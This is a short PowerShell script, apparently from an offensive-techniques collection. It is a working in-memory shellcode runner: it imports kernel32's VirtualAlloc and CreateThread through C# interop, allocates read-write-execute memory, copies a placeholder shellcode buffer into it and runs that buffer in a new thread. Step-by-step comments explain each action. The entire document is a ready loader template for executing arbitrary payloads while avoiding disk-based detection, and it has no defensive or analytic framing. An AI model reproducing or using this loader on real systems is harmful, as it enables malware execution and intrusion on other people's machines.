$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@



Add-Type $Kernel32

# Import Win32 APIs over C# class. More information on InvokeWin32APIs.ps1.

[Byte[]] $buf = <SHELLCODE>

$size = $buf.Length

# Define two variables that have our shellcode and his size.

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40);

# Allocate memory for our shellcode.

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

# Copy the shellcode content to the reserved memory region.

$thandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0);

# Creates a thread on the current process as a childprocess to execute our shellcode.